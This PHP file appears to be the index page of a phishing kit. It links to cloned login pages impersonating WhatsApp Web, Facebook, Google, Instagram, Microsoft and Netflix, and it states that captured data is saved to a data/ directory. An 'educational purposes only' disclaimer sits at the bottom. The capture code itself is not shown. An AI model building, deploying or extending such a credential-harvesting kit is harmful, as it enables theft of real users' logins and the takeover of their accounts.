<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';
$pages = [
    'Whatsapp.php'  => 'WhatsApp Web — device linking',
    'Facebook.php'  => 'Facebook — login',
    'Google.php'    => 'Google — sign in',
    'Instagram.php' => 'Instagram — login',
    'Microsoft.php' => 'Microsoft — sign in',
    'Netflix.php'   => 'Netflix — sign in',
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Phishing Pages — PHP</title>
<style>
body { font-family: "Segoe UI", Arial, sans-serif; background:#111b21; color:#e9edef; margin:0; padding:40px; }
h1 { font-weight:300; }
ul { list-style:none; padding:0; }
li { margin:10px 0; }
a { color:#00a884; text-decoration:none; font-size:16px; }
a:hover { text-decoration:underline; }
.note { color:#8696a0; font-size:13px; margin-top:24px; max-width:600px; line-height:1.6; }
</style>
</head>
<body>
<h1>Available pages</h1>
<ul>
<?php foreach ($pages as $file => $label): ?>
    <li><a href="<?php echo htmlspecialchars($file); ?>"><?php echo htmlspecialchars($label); ?></a></li>
<?php endforeach; ?>
</ul>
<p class="note">
    For educational and experimental purposes only. Do not use in a way that harms anyone.
    Captured data is written to the <code>data/</code> directory.
</p>
</body>
</html>
